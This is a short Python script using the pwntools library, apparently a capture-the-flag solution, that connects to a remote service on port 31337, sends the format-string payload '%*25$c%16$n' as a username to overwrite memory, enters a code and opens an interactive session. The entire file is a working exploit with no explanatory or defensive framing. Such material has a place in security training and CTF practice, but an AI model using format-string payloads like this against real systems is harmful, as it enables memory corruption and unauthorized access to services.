from pwn import * 

conn = remote('mebeim.toh.info', 31337)   

conn.recvuntil('user:')

payload = '%*25$c%16$n'

print(f'payload: {payload}')
conn.sendline(payload)

conn.recvuntil('code:')
conn.sendline('palle')

conn.interactive()